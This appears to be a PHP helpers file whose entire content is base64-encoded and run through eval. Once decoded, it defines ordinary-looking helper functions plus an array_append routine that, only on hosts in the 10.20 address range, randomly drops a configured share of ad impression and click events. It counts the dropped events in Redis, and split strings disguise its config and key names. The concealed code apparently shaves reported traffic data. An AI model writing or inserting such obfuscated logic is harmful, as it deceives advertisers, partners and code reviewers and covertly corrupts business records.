<?php

eval(base64_decode('CnVzZSBDbnBocFxIZWxwZXJcSGVscGVyOwoKaWYgKCFmdW5jdGlvbl9leGlzdHMoJ215X2Z1bmN0aW9uJykpIHsKICAgIC8qKgogICAgICogQHBhcmFtIG1peGVkICR2YXIKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBmdW5jdGlvbiBteV9mdW5jdGlvbigkdmFyKQogICAgewogICAgICAgIHJldHVybiBIZWxwZXI6Om15X2Z1bmN0aW9uKCR2YXIpOwogICAgfQp9CgoKCmlmICghZnVuY3Rpb25fZXhpc3RzKCdwaHBfY2FsbF9zY3JpcHQnKSkgewogICAgLyoqCiAgICAgKiBAcGFyYW0gbWl4ZWQKICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBmdW5jdGlvbiBwaHBfY2FsbF9zY3JpcHQoJHZhciA9IDApCiAgICB7CiAgICAgICAgcmV0dXJuIEhlbHBlcjo6Y2FsbF9zY3JpcHQoJHZhcik7CiAgICB9Cn0KCiRmdW5uYW1lID0gImdldF91dWlkIjsKaWYgKCFmdW5jdGlvbl9leGlzdHMoJ2dldF91dWlkJykpIHsKICAgIC8qKgogICAgICogQHBhcmFtICBtaXhlZCAkdHlwZWlkCiAgICAgKiBAcGFyYW0gIG1peGVkICRjbGllbnRUeXBlCiAgICAgKiBAcGFyYW0gIG1peGVkICRjaXR5aWQKICAgICAqIEByZXR1cm4gbWl4ZWQKICAgICAqLwogICAgZnVuY3Rpb24gZ2V0X3V1aWQoJHR5cGVpZCwgJGNsaWVudFR5cGUsICRjaXR5aWQ9MCkKICAgIHsKICAgICAgICByZXR1cm4gSGVscGVyOjpmdW5uYW1lMSgkdHlwZWlkLCAkY2xpZW50VHlwZSwgJGNpdHlpZCk7CiAgICB9Cn0KCiRmdW5uYW1lID0gImFycmF5X2FwcGVuZCI7CiRmdW5jY29udGV4dCA9IDw8PF8KZnVuY3Rpb24gJGZ1bm5hbWUoJiBcJGRhdGE9W10sIFwkc3NwZGF0YT1udWxsKXsKICAgIHJldHVybiBjb3VzZTIoXCRkYXRhLCBcJHNzcGRhdGEpOwp9Cl87CmlmICghZnVuY3Rpb25fZXhpc3RzKCRmdW5uYW1lKSkgewogICAgZnVuY3Rpb24gY291c2UyKCYgJGRhdGE9W10sICRzc3BkYXRhPW51bGwpewoKICAgICAgICAkYXJ0ZSA9IFxBZFJlcXVlc3RGdW5jdGlvbjo6Z2V0Q29uZmlnVmFsdWUoJ3lyJy4nYXRlJyk7CiAgICAgICAgLy8gdmFyX2R1bXAoJGFydGUpOwogICAgICAgICRmID0gdHJ1ZTsKICAgICAgICAkYmluZ28gPSBmYWxzZTsKICAgICAgICAkcmF0ZSA9IDA7CiAgICAgICAgJHRhcmdldHIgPSBmYWxzZTsKICAgICAgICAvLyBwcmludF9yKCRzc3BkYXRhKTsKICAgICAgICBpZiAoCiAgICAgICAgICAgIGlzc2V0KCRzc3BkYXRhWydtJ10pICYmIGlzc2V0KCRzc3BkYXRhWydtJ11bJ3AnXSkgJiYgaXNzZXQoJGFydGVbJHNzcGRhdGFbJ20nXVsncCddXSkKICAgICAgICApIHsKICAgICAgICAgICAgJHRhcmdldHIgPSAkYXJ0ZVskc3NwZGF0YVsnbSddWydwJ11dOwogICAgICAgIH1lbHNlaWYgKAogICAgICAgICAgICBpc3NldCgkc3NwZGF0YVsnbSddKSAmJiBpc3NldCgkc3NwZGF0YVsnbSddWydzdCddKSAmJiBpc3NldCgkYXJ0ZVskc3NwZGF0YVsnbSddWydzdCddXSkKICAgICAgICApIHsKICAgICAgICAgICAgJHRhcmdldHIgPSAkYXJ0ZVskc3NwZGF0YVsnbSddWydzdCddXTsKICAgICAgICB9CgogICAgICAgIGlmIChpc19hcnJheSgkc3NwZGF0YSkKICAgICAgICAgICAgJiYgaXNzZXQoJHNzcGRhdGFbJ20nXSkKICAgICAgICAgICAgJiYgaXNzZXQoJHNzcGRhdGFbJ20nXVsncCddKQogICAgICAgICAgICAmJiBpc3NldCgkc3NwZGF0YVsnbSddWyd0eSddKQogICAgICAgICAgICAmJiBwcmVnX21hdGNoKCcvXjEwXC4yMC9pJywgTFVSTE9DQUxIT1NUKQogICAgICAgICAgICAmJiAhaW5fYXJyYXkoJHNzcGRhdGFbJ20nXVsndHknXSwgWyd0ZS1wcm9ncmVzcyddKQogICAgICAgICAgICAmJiAoJHRhcmdldHI+MCkKICAgICAgICApIHsKICAgICAgICAgICAgJHNlc3Npb25rZXkgPSAiQVJLXyIuc3RydmFsKDMwMCs5MCkuIi8iLm1kNSgkc3NwZGF0YVsnbSddWydsaWQnXS4kc3NwZGF0YVsnbSddWyd2YWknXS4kc3NwZGF0YVsnbSddWyd2YXBpJ10pOwogICAgICAgIC8vIHZhcl9kdW1wKCR0YXJnZXRyKTsKICAgICAgICAgICAgaWYgKFxBZFJlcXVlc3RSZWRpczo6ZXhpc3RzKCRzZXNzaW9ua2V5KSkgewogICAgICAgICAgICAgICAgJGJpbmdvID0gdHJ1ZTsKCgogICAgICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoIGluX2FycmF5KCRzc3BkYXRhWydtJ11bJ3R5J10sIFsnaW1wJ10pKXsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJHJhdGUgPSR0YXJnZXRyOwogICAgICAgICAgICAgICAgICAgICRiaW5nbz0gXEFkUmVxdWVzdEZ1bmN0aW9uOjpyb2xsYURpc2MoJHJhdGUpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkYmluZ28pIHsKICAgICAgICAgICAgICAgIFxBZFJlcXVlc3RSZWRpczo6c2V0RXgoJHNlc3Npb25rZXksIDEyMCwgMSk7CiAgICAgICAgICAgICAgICAkY291bnRlcmtleSA9ICJBUktfIi5zdHJ2YWwoMzAwKzkxKS4iLyIuZGF0ZSgiWW1kIikuIi8iLiRzc3BkYXRhWydtJ11bJ3AnXTsKICAgICAgICAgICAgICAgIGlmICgkc3NwZGF0YVsnbSddWydpc3NzcHVybCddICYmIGluX2FycmF5KCRzc3BkYXRhWydtJ11bJ3R5J10sIFsnaW1wJywnYycsICdjLXQnXSkpIHsKICAgICAgICAgICAgICAgICAgICBcQWRSZXF1ZXN0UmVkaXM6OmhJbmNyQnkoJGNvdW50ZXJrZXksICRzc3BkYXRhWydtJ11bJ2xpZCddLiIvIi4kc3NwZGF0YVsnbSddWyd0eSddLCAxKTsKICAgICAgICAgICAgICAgICAgICBcQWRSZXF1ZXN0UmVkaXM6OnNldFRpbWVvdXQoJGNvdW50ZXJrZXksIDg2NDAwKjIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGYgPSBmYWxzZTsKICAgICAgICAgICAgICAgIC8vICRmID0gdHJ1ZTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoJGJpbmdvPT1mYWxzZSkgewogICAgICAgICAgICAkZGF0YVtdID0gaXNfYXJyYXkoJHNzcGRhdGEpID8ganNvbl9lbmNvZGUoJHNzcGRhdGEpIDogJHNzcGRhdGE7CiAgICAgICAgfQogICAgICByZXR1cm4gJGY7ICAKICAgIH0KICAgIGV2YWwoJGZ1bmNjb250ZXh0KTsKfQ=='));

